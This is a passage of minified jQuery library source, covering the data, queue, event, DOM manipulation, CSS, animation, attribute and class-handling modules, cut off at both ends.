                        He.set(o, "hasDataAttrs", !0) } return r } return "object" == typeof e ? this.each(function() { Ve.set(this, e) }) : Ne(this, function(t) { var n; if (o && void 0 === t) { if (void 0 !== (n = Ve.get(o, e))) return n; if (void 0 !== (n = x(o, e))) return n } else this.each(function() { Ve.set(this, e, t) }) }, null, t, arguments.length > 1, null, !0) }, removeData: function(e) { return this.each(function() { Ve.remove(this, e) }) } }), Ce.extend({ queue: function(e, t, n) { var i; if (e) return t = (t || "fx") + "queue", i = He.get(e, t), n && (!i || Array.isArray(n) ? i = He.access(e, t, Ce.makeArray(n)) : i.push(n)), i || [] }, dequeue: function(e, t) { t = t || "fx"; var n = Ce.queue(e, t),
                    i = n.length,
                    r = n.shift(),
                    o = Ce._queueHooks(e, t),
                    a = function() { Ce.dequeue(e, t) }; "inprogress" === r && (r = n.shift(), i--), r && ("fx" === t && n.unshift("inprogress"), delete o.stop, r.call(e, a, o)), !i && o && o.empty.fire() }, _queueHooks: function(e, t) { var n = t + "queueHooks"; return He.get(e, n) || He.access(e, n, { empty: Ce.Callbacks("once memory").add(function() { He.remove(e, [t + "queue", n]) }) }) } }), Ce.fn.extend({ queue: function(e, t) { var n = 2; return "string" != typeof e && (t = e, e = "fx", n--), arguments.length < n ? Ce.queue(this[0], e) : void 0 === t ? this : this.each(function() { var n = Ce.queue(this, e, t);
                    Ce._queueHooks(this, e), "fx" === e && "inprogress" !== n[0] && Ce.dequeue(this, e) }) }, dequeue: function(e) { return this.each(function() { Ce.dequeue(this, e) }) }, clearQueue: function(e) { return this.queue(e || "fx", []) }, promise: function(e, t) { var n, i = 1,
                    r = Ce.Deferred(),
                    o = this,
                    a = this.length,
                    s = function() {--i || r.resolveWith(o, [o]) }; for ("string" != typeof e && (t = e, e = void 0), e = e || "fx"; a--;)(n = He.get(o[a], e + "queueHooks")) && n.empty && (i++, n.empty.add(s)); return s(), r.promise(t) } });
        var Ye = /[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,
            Xe = new RegExp("^(?:([+-])=|)(" + Ye + ")([a-z%]*)$", "i"),
            $e = ["Top", "Right", "Bottom", "Left"],
            Ge = function(e, t) { return e = t || e, "none" === e.style.display || "" === e.style.display && Ce.contains(e.ownerDocument, e) && "none" === Ce.css(e, "display") },
            Je = function(e, t, n, i) { var r, o, a = {}; for (o in t) a[o] = e.style[o], e.style[o] = t[o];
                r = n.apply(e, i || []); for (o in t) e.style[o] = a[o]; return r },
            Ze = {};
        Ce.fn.extend({ show: function() { return k(this, !0) }, hide: function() { return k(this) }, toggle: function(e) { return "boolean" == typeof e ? e ? this.show() : this.hide() : this.each(function() { Ge(this) ? Ce(this).show() : Ce(this).hide() }) } });
        var Qe = /^(?:checkbox|radio)$/i,
            et = /<([a-z][^\/\0>\x20\t\r\n\f]+)/i,
            tt = /^$|^module$|\/(?:java|ecma)script/i,
            nt = { option: [1, "<select multiple='multiple'>", "</select>"], thead: [1, "<table>", "</table>"], col: [2, "<table><colgroup>", "</colgroup></table>"], tr: [2, "<table><tbody>", "</tbody></table>"], td: [3, "<table><tbody><tr>", "</tr></tbody></table>"], _default: [0, "", ""] };
        nt.optgroup = nt.option, nt.tbody = nt.tfoot = nt.colgroup = nt.caption = nt.thead, nt.th = nt.td;
        var it = /<|&#?\w+;/;
        ! function() { var e = le.createDocumentFragment(),
                t = e.appendChild(le.createElement("div")),
                n = le.createElement("input");
            n.setAttribute("type", "radio"), n.setAttribute("checked", "checked"), n.setAttribute("name", "t"), t.appendChild(n), xe.checkClone = t.cloneNode(!0).cloneNode(!0).lastChild.checked, t.innerHTML = "<textarea>x</textarea>", xe.noCloneChecked = !!t.cloneNode(!0).lastChild.defaultValue }();
        var rt = le.documentElement,
            ot = /^key/,
            at = /^(?:mouse|pointer|contextmenu|drag|drop)|click/,
            st = /^([^.]*)(?:\.(.+)|)/;
        Ce.event = { global: {}, add: function(e, t, n, i, r) { var o, a, s, c, u, l, d, f, h, p, b, m = He.get(e); if (m)
                    for (n.handler && (o = n, n = o.handler, r = o.selector), r && Ce.find.matchesSelector(rt, r), n.guid || (n.guid = Ce.guid++), (c = m.events) || (c = m.events = {}), (a = m.handle) || (a = m.handle = function(t) { return void 0 !== Ce && Ce.event.triggered !== t.type ? Ce.event.dispatch.apply(e, arguments) : void 0 }), t = (t || "").match(qe) || [""], u = t.length; u--;) s = st.exec(t[u]) || [], h = b = s[1], p = (s[2] || "").split(".").sort(), h && (d = Ce.event.special[h] || {}, h = (r ? d.delegateType : d.bindType) || h, d = Ce.event.special[h] || {}, l = Ce.extend({ type: h, origType: b, data: i, handler: n, guid: n.guid, selector: r, needsContext: r && Ce.expr.match.needsContext.test(r), namespace: p.join(".") }, o), (f = c[h]) || (f = c[h] = [], f.delegateCount = 0, d.setup && !1 !== d.setup.call(e, i, p, a) || e.addEventListener && e.addEventListener(h, a)), d.add && (d.add.call(e, l), l.handler.guid || (l.handler.guid = n.guid)), r ? f.splice(f.delegateCount++, 0, l) : f.push(l), Ce.event.global[h] = !0) }, remove: function(e, t, n, i, r) { var o, a, s, c, u, l, d, f, h, p, b, m = He.hasData(e) && He.get(e); if (m && (c = m.events)) { for (t = (t || "").match(qe) || [""], u = t.length; u--;)
                        if (s = st.exec(t[u]) || [], h = b = s[1], p = (s[2] || "").split(".").sort(), h) { for (d = Ce.event.special[h] || {}, h = (i ? d.delegateType : d.bindType) || h, f = c[h] || [], s = s[2] && new RegExp("(^|\\.)" + p.join("\\.(?:.*\\.|)") + "(\\.|$)"), a = o = f.length; o--;) l = f[o], !r && b !== l.origType || n && n.guid !== l.guid || s && !s.test(l.namespace) || i && i !== l.selector && ("**" !== i || !l.selector) || (f.splice(o, 1), l.selector && f.delegateCount--, d.remove && d.remove.call(e, l));
                            a && !f.length && (d.teardown && !1 !== d.teardown.call(e, p, m.handle) || Ce.removeEvent(e, h, m.handle), delete c[h]) } else
                            for (h in c) Ce.event.remove(e, h + t[u], n, i, !0);
                    Ce.isEmptyObject(c) && He.remove(e, "handle events") } }, dispatch: function(e) { var t, n, i, r, o, a, s = Ce.event.fix(e),
                    c = new Array(arguments.length),
                    u = (He.get(this, "events") || {})[s.type] || [],
                    l = Ce.event.special[s.type] || {}; for (c[0] = s, t = 1; t < arguments.length; t++) c[t] = arguments[t]; if (s.delegateTarget = this, !l.preDispatch || !1 !== l.preDispatch.call(this, s)) { for (a = Ce.event.handlers.call(this, s, u), t = 0;
                        (r = a[t++]) && !s.isPropagationStopped();)
                        for (s.currentTarget = r.elem, n = 0;
                            (o = r.handlers[n++]) && !s.isImmediatePropagationStopped();) s.rnamespace && !s.rnamespace.test(o.namespace) || (s.handleObj = o, s.data = o.data, void 0 !== (i = ((Ce.event.special[o.origType] || {}).handle || o.handler).apply(r.elem, c)) && !1 === (s.result = i) && (s.preventDefault(), s.stopPropagation())); return l.postDispatch && l.postDispatch.call(this, s), s.result } }, handlers: function(e, t) { var n, i, r, o, a, s = [],
                    c = t.delegateCount,
                    u = e.target; if (c && u.nodeType && !("click" === e.type && e.button >= 1))
                    for (; u !== this; u = u.parentNode || this)
                        if (1 === u.nodeType && ("click" !== e.type || !0 !== u.disabled)) { for (o = [], a = {}, n = 0; n < c; n++) i = t[n], r = i.selector + " ", void 0 === a[r] && (a[r] = i.needsContext ? Ce(r, this).index(u) > -1 : Ce.find(r, this, null, [u]).length), a[r] && o.push(i);
                            o.length && s.push({ elem: u, handlers: o }) }
                return u = this, c < t.length && s.push({ elem: u, handlers: t.slice(c) }), s }, addProp: function(e, t) { Object.defineProperty(Ce.Event.prototype, e, { enumerable: !0, configurable: !0, get: Se(t) ? function() { if (this.originalEvent) return t(this.originalEvent) } : function() { if (this.originalEvent) return this.originalEvent[e] }, set: function(t) { Object.defineProperty(this, e, { enumerable: !0, configurable: !0, writable: !0, value: t }) } }) }, fix: function(e) { return e[Ce.expando] ? e : new Ce.Event(e) }, special: { load: { noBubble: !0 }, focus: { trigger: function() { if (this !== R() && this.focus) return this.focus(), !1 }, delegateType: "focusin" }, blur: { trigger: function() { if (this === R() && this.blur) return this.blur(), !1 }, delegateType: "focusout" }, click: { trigger: function() { if ("checkbox" === this.type && this.click && u(this, "input")) return this.click(), !1 }, _default: function(e) { return u(e.target, "a") } }, beforeunload: { postDispatch: function(e) { void 0 !== e.result && e.originalEvent && (e.originalEvent.returnValue = e.result) } } } }, Ce.removeEvent = function(e, t, n) { e.removeEventListener && e.removeEventListener(t, n) }, Ce.Event = function(e, t) { if (!(this instanceof Ce.Event)) return new Ce.Event(e, t);
            e && e.type ? (this.originalEvent = e, this.type = e.type, this.isDefaultPrevented = e.defaultPrevented || void 0 === e.defaultPrevented && !1 === e.returnValue ? T : M, this.target = e.target && 3 === e.target.nodeType ? e.target.parentNode : e.target, this.currentTarget = e.currentTarget, this.relatedTarget = e.relatedTarget) : this.type = e, t && Ce.extend(this, t), this.timeStamp = e && e.timeStamp || Date.now(), this[Ce.expando] = !0 }, Ce.Event.prototype = { constructor: Ce.Event, isDefaultPrevented: M, isPropagationStopped: M, isImmediatePropagationStopped: M, isSimulated: !1, preventDefault: function() { var e = this.originalEvent;
                this.isDefaultPrevented = T, e && !this.isSimulated && e.preventDefault() }, stopPropagation: function() { var e = this.originalEvent;
                this.isPropagationStopped = T, e && !this.isSimulated && e.stopPropagation() }, stopImmediatePropagation: function() { var e = this.originalEvent;
                this.isImmediatePropagationStopped = T, e && !this.isSimulated && e.stopImmediatePropagation(), this.stopPropagation() } }, Ce.each({ altKey: !0, bubbles: !0, cancelable: !0, changedTouches: !0, ctrlKey: !0, detail: !0, eventPhase: !0, metaKey: !0, pageX: !0, pageY: !0, shiftKey: !0, view: !0, char: !0, charCode: !0, key: !0, keyCode: !0, button: !0, buttons: !0, clientX: !0, clientY: !0, offsetX: !0, offsetY: !0, pointerId: !0, pointerType: !0, screenX: !0, screenY: !0, targetTouches: !0, toElement: !0, touches: !0, which: function(e) { var t = e.button; return null == e.which && ot.test(e.type) ? null != e.charCode ? e.charCode : e.keyCode : !e.which && void 0 !== t && at.test(e.type) ? 1 & t ? 1 : 2 & t ? 3 : 4 & t ? 2 : 0 : e.which } }, Ce.event.addProp), Ce.each({ mouseenter: "mouseover", mouseleave: "mouseout", pointerenter: "pointerover", pointerleave: "pointerout" }, function(e, t) { Ce.event.special[e] = { delegateType: t, bindType: t, handle: function(e) { var n, i = this,
                        r = e.relatedTarget,
                        o = e.handleObj; return r && (r === i || Ce.contains(i, r)) || (e.type = o.origType, n = o.handler.apply(this, arguments), e.type = t), n } } }), Ce.fn.extend({ on: function(e, t, n, i) { return P(this, e, t, n, i) }, one: function(e, t, n, i) { return P(this, e, t, n, i, 1) }, off: function(e, t, n) { var i, r; if (e && e.preventDefault && e.handleObj) return i = e.handleObj, Ce(e.delegateTarget).off(i.namespace ? i.origType + "." + i.namespace : i.origType, i.selector, i.handler), this; if ("object" == typeof e) { for (r in e) this.off(r, t, e[r]); return this } return !1 !== t && "function" != typeof t || (n = t, t = void 0), !1 === n && (n = M), this.each(function() { Ce.event.remove(this, e, n, t) }) } });
        var ct = /<(?!area|br|col|embed|hr|img|input|link|meta|param)(([a-z][^\/\0>\x20\t\r\n\f]*)[^>]*)\/>/gi,
            ut = /<script|<style|<link/i,
            lt = /checked\s*(?:[^=]|=\s*.checked.)/i,
            dt = /^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g;
        Ce.extend({ htmlPrefilter: function(e) { return e.replace(ct, "<$1></$2>") }, clone: function(e, t, n) { var i, r, o, a, s = e.cloneNode(!0),
                    c = Ce.contains(e.ownerDocument, e); if (!(xe.noCloneChecked || 1 !== e.nodeType && 11 !== e.nodeType || Ce.isXMLDoc(e)))
                    for (a = C(s), o = C(e), i = 0, r = o.length; i < r; i++) q(o[i], a[i]); if (t)
                    if (n)
                        for (o = o || C(e), a = a || C(s), i = 0, r = o.length; i < r; i++) j(o[i], a[i]);
                    else j(e, s); return a = C(s, "script"), a.length > 0 && A(a, !c && C(e, "script")), s }, cleanData: function(e) { for (var t, n, i, r = Ce.event.special, o = 0; void 0 !== (n = e[o]); o++)
                    if (Ue(n)) { if (t = n[He.expando]) { if (t.events)
                                for (i in t.events) r[i] ? Ce.event.remove(n, i) : Ce.removeEvent(n, i, t.handle);
                            n[He.expando] = void 0 } n[Ve.expando] && (n[Ve.expando] = void 0) } } }), Ce.fn.extend({ detach: function(e) { return L(this, e, !0) }, remove: function(e) { return L(this, e) }, text: function(e) { return Ne(this, function(e) { return void 0 === e ? Ce.text(this) : this.empty().each(function() { 1 !== this.nodeType && 11 !== this.nodeType && 9 !== this.nodeType || (this.textContent = e) }) }, null, e, arguments.length) }, append: function() { return B(this, arguments, function(e) { if (1 === this.nodeType || 11 === this.nodeType || 9 === this.nodeType) { I(this, e).appendChild(e) } }) }, prepend: function() { return B(this, arguments, function(e) { if (1 === this.nodeType || 11 === this.nodeType || 9 === this.nodeType) { var t = I(this, e);
                        t.insertBefore(e, t.firstChild) } }) }, before: function() { return B(this, arguments, function(e) { this.parentNode && this.parentNode.insertBefore(e, this) }) }, after: function() { return B(this, arguments, function(e) { this.parentNode && this.parentNode.insertBefore(e, this.nextSibling) }) }, empty: function() { for (var e, t = 0; null != (e = this[t]); t++) 1 === e.nodeType && (Ce.cleanData(C(e, !1)), e.textContent = ""); return this }, clone: function(e, t) { return e = null != e && e, t = null == t ? e : t, this.map(function() { return Ce.clone(this, e, t) }) }, html: function(e) { return Ne(this, function(e) { var t = this[0] || {},
                        n = 0,
                        i = this.length; if (void 0 === e && 1 === t.nodeType) return t.innerHTML; if ("string" == typeof e && !ut.test(e) && !nt[(et.exec(e) || ["", ""])[1].toLowerCase()]) { e = Ce.htmlPrefilter(e); try { for (; n < i; n++) t = this[n] || {}, 1 === t.nodeType && (Ce.cleanData(C(t, !1)), t.innerHTML = e);
                            t = 0 } catch (e) {} } t && this.empty().append(e) }, null, e, arguments.length) }, replaceWith: function() { var e = []; return B(this, arguments, function(t) { var n = this.parentNode;
                    Ce.inArray(this, e) < 0 && (Ce.cleanData(C(this)), n && n.replaceChild(t, this)) }, e) } }), Ce.each({ appendTo: "append", prependTo: "prepend", insertBefore: "before", insertAfter: "after", replaceAll: "replaceWith" }, function(e, t) { Ce.fn[e] = function(e) { for (var n, i = [], r = Ce(e), o = r.length - 1, a = 0; a <= o; a++) n = a === o ? this : this.clone(!0), Ce(r[a])[t](n), pe.apply(i, n.get()); return this.pushStack(i) } });
        var ft = new RegExp("^(" + Ye + ")(?!px)[a-z%]+$", "i"),
            ht = function(e) { var t = e.ownerDocument.defaultView; return t && t.opener || (t = n), t.getComputedStyle(e) },
            pt = new RegExp($e.join("|"), "i");
        ! function() {
            function e() { if (u) { c.style.cssText = "position:absolute;left:-11111px;width:60px;margin-top:1px;padding:0;border:0", u.style.cssText = "position:relative;display:block;box-sizing:border-box;overflow:scroll;margin:auto;border:1px;padding:1px;width:60%;top:1%", rt.appendChild(c).appendChild(u); var e = n.getComputedStyle(u);
                    i = "1%" !== e.top, s = 12 === t(e.marginLeft), u.style.right = "60%", a = 36 === t(e.right), r = 36 === t(e.width), u.style.position = "absolute", o = 36 === u.offsetWidth || "absolute", rt.removeChild(c), u = null } }

            function t(e) { return Math.round(parseFloat(e)) } var i, r, o, a, s, c = le.createElement("div"),
                u = le.createElement("div");
            u.style && (u.style.backgroundClip = "content-box", u.cloneNode(!0).style.backgroundClip = "", xe.clearCloneStyle = "content-box" === u.style.backgroundClip, Ce.extend(xe, { boxSizingReliable: function() { return e(), r }, pixelBoxStyles: function() { return e(), a }, pixelPosition: function() { return e(), i }, reliableMarginLeft: function() { return e(), s }, scrollboxSize: function() { return e(), o } })) }();
        var bt = /^(none|table(?!-c[ea]).+)/,
            mt = /^--/,
            gt = { position: "absolute", visibility: "hidden", display: "block" },
            vt = { letterSpacing: "0", fontWeight: "400" },
            yt = ["Webkit", "Moz", "ms"],
            wt = le.createElement("div").style;
        Ce.extend({ cssHooks: { opacity: { get: function(e, t) { if (t) { var n = N(e, "opacity"); return "" === n ? "1" : n } } } }, cssNumber: { animationIterationCount: !0, columnCount: !0, fillOpacity: !0, flexGrow: !0, flexShrink: !0, fontWeight: !0, lineHeight: !0, opacity: !0, order: !0, orphans: !0, widows: !0, zIndex: !0, zoom: !0 }, cssProps: {}, style: function(e, t, n, i) { if (e && 3 !== e.nodeType && 8 !== e.nodeType && e.style) { var r, o, a, s = v(t),
                        c = mt.test(t),
                        u = e.style; if (c || (t = U(s)), a = Ce.cssHooks[t] || Ce.cssHooks[s], void 0 === n) return a && "get" in a && void 0 !== (r = a.get(e, !1, i)) ? r : u[t];
                    o = typeof n, "string" === o && (r = Xe.exec(n)) && r[1] && (n = S(e, t, r), o = "number"), null != n && n === n && ("number" === o && (n += r && r[3] || (Ce.cssNumber[s] ? "" : "px")), xe.clearCloneStyle || "" !== n || 0 !== t.indexOf("background") || (u[t] = "inherit"), a && "set" in a && void 0 === (n = a.set(e, n, i)) || (c ? u.setProperty(t, n) : u[t] = n)) } }, css: function(e, t, n, i) { var r, o, a, s = v(t); return mt.test(t) || (t = U(s)), a = Ce.cssHooks[t] || Ce.cssHooks[s], a && "get" in a && (r = a.get(e, !0, n)), void 0 === r && (r = N(e, t, i)), "normal" === r && t in vt && (r = vt[t]), "" === n || n ? (o = parseFloat(r), !0 === n || isFinite(o) ? o || 0 : r) : r } }), Ce.each(["height", "width"], function(e, t) { Ce.cssHooks[t] = { get: function(e, n, i) { if (n) return !bt.test(Ce.css(e, "display")) || e.getClientRects().length && e.getBoundingClientRect().width ? W(e, t, i) : Je(e, gt, function() { return W(e, t, i) }) }, set: function(e, n, i) { var r, o = ht(e),
                        a = "border-box" === Ce.css(e, "boxSizing", !1, o),
                        s = i && V(e, t, i, a, o); return a && xe.scrollboxSize() === o.position && (s -= Math.ceil(e["offset" + t[0].toUpperCase() + t.slice(1)] - parseFloat(o[t]) - V(e, t, "border", !1, o) - .5)), s && (r = Xe.exec(n)) && "px" !== (r[3] || "px") && (e.style[t] = n, n = Ce.css(e, t)), H(e, n, s) } } }), Ce.cssHooks.marginLeft = F(xe.reliableMarginLeft, function(e, t) { if (t) return (parseFloat(N(e, "marginLeft")) || e.getBoundingClientRect().left - Je(e, { marginLeft: 0 }, function() { return e.getBoundingClientRect().left })) + "px" }), Ce.each({ margin: "", padding: "", border: "Width" }, function(e, t) { Ce.cssHooks[e + t] = { expand: function(n) { for (var i = 0, r = {}, o = "string" == typeof n ? n.split(" ") : [n]; i < 4; i++) r[e + $e[i] + t] = o[i] || o[i - 2] || o[0]; return r } }, "margin" !== e && (Ce.cssHooks[e + t].set = H) }), Ce.fn.extend({ css: function(e, t) { return Ne(this, function(e, t, n) { var i, r, o = {},
                        a = 0; if (Array.isArray(t)) { for (i = ht(e), r = t.length; a < r; a++) o[t[a]] = Ce.css(e, t[a], !1, i); return o } return void 0 !== n ? Ce.style(e, t, n) : Ce.css(e, t) }, e, t, arguments.length > 1) } }), Ce.Tween = K, K.prototype = { constructor: K, init: function(e, t, n, i, r, o) { this.elem = e, this.prop = n, this.easing = r || Ce.easing._default, this.options = t, this.start = this.now = this.cur(), this.end = i, this.unit = o || (Ce.cssNumber[n] ? "" : "px") }, cur: function() { var e = K.propHooks[this.prop]; return e && e.get ? e.get(this) : K.propHooks._default.get(this) }, run: function(e) { var t, n = K.propHooks[this.prop]; return this.options.duration ? this.pos = t = Ce.easing[this.easing](e, this.options.duration * e, 0, 1, this.options.duration) : this.pos = t = e, this.now = (this.end - this.start) * t + this.start, this.options.step && this.options.step.call(this.elem, this.now, this), n && n.set ? n.set(this) : K.propHooks._default.set(this), this } }, K.prototype.init.prototype = K.prototype, K.propHooks = { _default: { get: function(e) { var t; return 1 !== e.elem.nodeType || null != e.elem[e.prop] && null == e.elem.style[e.prop] ? e.elem[e.prop] : (t = Ce.css(e.elem, e.prop, ""), t && "auto" !== t ? t : 0) }, set: function(e) { Ce.fx.step[e.prop] ? Ce.fx.step[e.prop](e) : 1 !== e.elem.nodeType || null == e.elem.style[Ce.cssProps[e.prop]] && !Ce.cssHooks[e.prop] ? e.elem[e.prop] = e.now : Ce.style(e.elem, e.prop, e.now + e.unit) } } }, K.propHooks.scrollTop = K.propHooks.scrollLeft = { set: function(e) { e.elem.nodeType && e.elem.parentNode && (e.elem[e.prop] = e.now) } }, Ce.easing = { linear: function(e) { return e }, swing: function(e) { return .5 - Math.cos(e * Math.PI) / 2 }, _default: "swing" }, Ce.fx = K.prototype.init, Ce.fx.step = {};
        var xt, St, _t = /^(?:toggle|show|hide)$/,
            kt = /queueHooks$/;
        Ce.Animation = Ce.extend(Q, { tweeners: { "*": [function(e, t) { var n = this.createTween(e, t); return S(n.elem, e, Xe.exec(t), n), n }] }, tweener: function(e, t) { Se(e) ? (t = e, e = ["*"]) : e = e.match(qe); for (var n, i = 0, r = e.length; i < r; i++) n = e[i], Q.tweeners[n] = Q.tweeners[n] || [], Q.tweeners[n].unshift(t) }, prefilters: [J], prefilter: function(e, t) { t ? Q.prefilters.unshift(e) : Q.prefilters.push(e) } }), Ce.speed = function(e, t, n) { var i = e && "object" == typeof e ? Ce.extend({}, e) : { complete: n || !n && t || Se(e) && e, duration: e, easing: n && t || t && !Se(t) && t }; return Ce.fx.off ? i.duration = 0 : "number" != typeof i.duration && (i.duration in Ce.fx.speeds ? i.duration = Ce.fx.speeds[i.duration] : i.duration = Ce.fx.speeds._default), null != i.queue && !0 !== i.queue || (i.queue = "fx"), i.old = i.complete, i.complete = function() { Se(i.old) && i.old.call(this), i.queue && Ce.dequeue(this, i.queue) }, i }, Ce.fn.extend({ fadeTo: function(e, t, n, i) { return this.filter(Ge).css("opacity", 0).show().end().animate({ opacity: t }, e, n, i) }, animate: function(e, t, n, i) { var r = Ce.isEmptyObject(e),
                        o = Ce.speed(t, n, i),
                        a = function() { var t = Q(this, Ce.extend({}, e), o);
                            (r || He.get(this, "finish")) && t.stop(!0) }; return a.finish = a, r || !1 === o.queue ? this.each(a) : this.queue(o.queue, a) }, stop: function(e, t, n) { var i = function(e) { var t = e.stop;
                        delete e.stop, t(n) }; return "string" != typeof e && (n = t, t = e, e = void 0), t && !1 !== e && this.queue(e || "fx", []), this.each(function() { var t = !0,
                            r = null != e && e + "queueHooks",
                            o = Ce.timers,
                            a = He.get(this); if (r) a[r] && a[r].stop && i(a[r]);
                        else
                            for (r in a) a[r] && a[r].stop && kt.test(r) && i(a[r]); for (r = o.length; r--;) o[r].elem !== this || null != e && o[r].queue !== e || (o[r].anim.stop(n), t = !1, o.splice(r, 1));!t && n || Ce.dequeue(this, e) }) }, finish: function(e) { return !1 !== e && (e = e || "fx"), this.each(function() { var t, n = He.get(this),
                            i = n[e + "queue"],
                            r = n[e + "queueHooks"],
                            o = Ce.timers,
                            a = i ? i.length : 0; for (n.finish = !0, Ce.queue(this, e, []), r && r.stop && r.stop.call(this, !0), t = o.length; t--;) o[t].elem === this && o[t].queue === e && (o[t].anim.stop(!0), o.splice(t, 1)); for (t = 0; t < a; t++) i[t] && i[t].finish && i[t].finish.call(this);
                        delete n.finish }) } }), Ce.each(["toggle", "show", "hide"], function(e, t) { var n = Ce.fn[t];
                Ce.fn[t] = function(e, i, r) { return null == e || "boolean" == typeof e ? n.apply(this, arguments) : this.animate($(t, !0), e, i, r) } }), Ce.each({ slideDown: $("show"), slideUp: $("hide"), slideToggle: $("toggle"), fadeIn: { opacity: "show" }, fadeOut: { opacity: "hide" }, fadeToggle: { opacity: "toggle" } }, function(e, t) { Ce.fn[e] = function(e, n, i) { return this.animate(t, e, n, i) } }), Ce.timers = [], Ce.fx.tick = function() { var e, t = 0,
                    n = Ce.timers; for (xt = Date.now(); t < n.length; t++)(e = n[t])() || n[t] !== e || n.splice(t--, 1);
                n.length || Ce.fx.stop(), xt = void 0 }, Ce.fx.timer = function(e) { Ce.timers.push(e), Ce.fx.start() }, Ce.fx.interval = 13, Ce.fx.start = function() { St || (St = !0, Y()) }, Ce.fx.stop = function() { St = null }, Ce.fx.speeds = { slow: 600, fast: 200, _default: 400 }, Ce.fn.delay = function(e, t) { return e = Ce.fx ? Ce.fx.speeds[e] || e : e, t = t || "fx", this.queue(t, function(t, i) { var r = n.setTimeout(t, e);
                    i.stop = function() { n.clearTimeout(r) } }) },
            function() { var e = le.createElement("input"),
                    t = le.createElement("select"),
                    n = t.appendChild(le.createElement("option"));
                e.type = "checkbox", xe.checkOn = "" !== e.value, xe.optSelected = n.selected, e = le.createElement("input"), e.value = "t", e.type = "radio", xe.radioValue = "t" === e.value }();
        var Ct, At = Ce.expr.attrHandle;
        Ce.fn.extend({ attr: function(e, t) { return Ne(this, Ce.attr, e, t, arguments.length > 1) }, removeAttr: function(e) { return this.each(function() { Ce.removeAttr(this, e) }) } }), Ce.extend({ attr: function(e, t, n) { var i, r, o = e.nodeType; if (3 !== o && 8 !== o && 2 !== o) return void 0 === e.getAttribute ? Ce.prop(e, t, n) : (1 === o && Ce.isXMLDoc(e) || (r = Ce.attrHooks[t.toLowerCase()] || (Ce.expr.match.bool.test(t) ? Ct : void 0)), void 0 !== n ? null === n ? void Ce.removeAttr(e, t) : r && "set" in r && void 0 !== (i = r.set(e, n, t)) ? i : (e.setAttribute(t, n + ""), n) : r && "get" in r && null !== (i = r.get(e, t)) ? i : (i = Ce.find.attr(e, t), null == i ? void 0 : i)) }, attrHooks: { type: { set: function(e, t) { if (!xe.radioValue && "radio" === t && u(e, "input")) { var n = e.value; return e.setAttribute("type", t), n && (e.value = n), t } } } }, removeAttr: function(e, t) { var n, i = 0,
                    r = t && t.match(qe); if (r && 1 === e.nodeType)
                    for (; n = r[i++];) e.removeAttribute(n) } }), Ct = { set: function(e, t, n) { return !1 === t ? Ce.removeAttr(e, n) : e.setAttribute(n, n), n } }, Ce.each(Ce.expr.match.bool.source.match(/\w+/g), function(e, t) { var n = At[t] || Ce.find.attr;
            At[t] = function(e, t, i) { var r, o, a = t.toLowerCase(); return i || (o = At[a], At[a] = r, r = null != n(e, t, i) ? a : null, At[a] = o), r } });
        var Et = /^(?:input|select|textarea|button)$/i,
            Tt = /^(?:a|area)$/i;
        Ce.fn.extend({ prop: function(e, t) { return Ne(this, Ce.prop, e, t, arguments.length > 1) }, removeProp: function(e) { return this.each(function() { delete this[Ce.propFix[e] || e] }) } }), Ce.extend({ prop: function(e, t, n) { var i, r, o = e.nodeType; if (3 !== o && 8 !== o && 2 !== o) return 1 === o && Ce.isXMLDoc(e) || (t = Ce.propFix[t] || t, r = Ce.propHooks[t]), void 0 !== n ? r && "set" in r && void 0 !== (i = r.set(e, n, t)) ? i : e[t] = n : r && "get" in r && null !== (i = r.get(e, t)) ? i : e[t] }, propHooks: { tabIndex: { get: function(e) { var t = Ce.find.attr(e, "tabindex"); return t ? parseInt(t, 10) : Et.test(e.nodeName) || Tt.test(e.nodeName) && e.href ? 0 : -1 } } }, propFix: { for: "htmlFor", class: "className" } }), xe.optSelected || (Ce.propHooks.selected = { get: function(e) { var t = e.parentNode; return t && t.parentNode && t.parentNode.selectedIndex, null }, set: function(e) { var t = e.parentNode;
                t && (t.selectedIndex, t.parentNode && t.parentNode.selectedIndex) } }), Ce.each(["tabIndex", "readOnly", "maxLength", "cellSpacing", "cellPadding", "rowSpan", "colSpan", "useMap", "frameBorder", "contentEditable"], function() { Ce.propFix[this.toLowerCase()] = this }), Ce.fn.extend({ addClass: function(e) { var t, n, i, r, o, a, s, c = 0; if (Se(e)) return this.each(function(t) { Ce(this).addClass(e.call(this, t, te(this))) }); if (t = ne(e), t.length)
                    for (; n = this[c++];)
                        if (r = te(n), i = 1 === n.nodeType && " " + ee(r) + " ") { for (a = 0; o = t[a++];) i.indexOf(" " + o + " ") < 0 && (i += o + " ");
                            s = ee(i), r !== s && n.setAttribute("class", s) }
                return this }, removeClass: function(e) { var t, n, i, r, o, a, s, c = 0; if (Se(e)) return this.each(function(t) { Ce(this).removeClass(e.call(this, t, te(this))) }); if (!arguments.length) return this.attr("class", ""); if (t = ne(e), t.length)
                    for (; n = this[c++];)
                        if (r = te(n), i = 1 === n.nodeType && " " + ee(r) + " ") { for (a = 0; o = t[a++];)
                                for (; i.indexOf(" " + o + " ") > -1;) i = i.replace(" " + o + " ", " ");
                            s = ee(i), r !== s && n.setAttribute("class", s) }
                return this }, toggleClass: function(e, t) { var n = typeof e,
                    i = "string" === n || Array.isArray(e); return "boolean" == typeof t && i ? t ? this.addClass(e) : this.removeClass(e) : Se(e) ? this.each(function(n) { Ce(this).toggleClass(e.call(this, n, te(this), t), t) }) : this.each(function() { var t, r, o, a; if (i)
                        for (r = 0, o = Ce(this), a = ne(e); t = a[r++];) o.hasClass(t) ? o.removeClass(t) : o.addClass(t);
                    else void 0 !== e && "boolean" !== n || (t = te(this), t && He.set(this, "__className__", t), this.setAttribute && this.setAttribute("class", t || !1 === e ? "" : He.get(this, "__className__") || "")) }) }, hasClass: function(e) { var t, n, i = 0; for (t = " " + e + " "; n = this[i++];)
                    if (1 === n.nodeType && (" " + ee(te(n)) + " ").indexOf(t) > -1) return !0; return !1 } });
        var Mt = /\r/g;
        Ce.fn.extend({ val: function(e) { var t, n, i, r = this[0]; { if (arguments.length) return i = Se(e), this.each(function(n) { var r;
